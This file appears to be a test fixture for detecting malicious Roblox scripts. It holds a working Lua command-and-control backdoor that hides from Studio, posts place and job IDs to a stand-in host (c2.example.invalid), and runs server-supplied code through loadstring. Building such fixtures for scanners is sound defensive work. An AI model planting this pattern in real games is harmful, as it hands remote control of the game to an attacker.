-- Fixture 2: Simulates a C2 polling backdoor with custom User-Agent, auth headers,
-- JSON payload, virtualized 15s polling interval, and loadstring execution of server command.
local RunService = game:GetService("RunService")
if RunService:IsStudio() or game.PlaceId == 0 then
	return
end

local HttpService = game:GetService("HttpService")
local endpoint = "https://c2.example.invalid/api/v1/poll?key=query_secret_12345"

for cycle = 1, 3 do
	local payload = HttpService:JSONEncode({
		placeId = game.PlaceId,
		jobId = game.JobId,
		cycle = cycle,
		authKey = "body_auth_token_abc987",
	})

	local resp = HttpService:RequestAsync({
		Url = endpoint,
		Method = "POST",
		Headers = {
			["User-Agent"] = "VoidBeacon/2.1",
			["Authorization"] = "Bearer header_bearer_secret_xyz",
			["X-Auth-Key"] = "x_auth_header_999",
			["Content-Type"] = "application/json",
		},
		Body = payload,
	})

	if resp and resp.Success and resp.Body then
		local ok, data = pcall(function()
			return HttpService:JSONDecode(resp.Body)
		end)
		if ok and type(data) == "table" and type(data.script) == "string" then
			local cmdFn = loadstring(data.script, "c2_cmd_" .. tostring(cycle))
			if cmdFn then
				cmdFn()
			end
		end
	end

	task.wait(15)
end
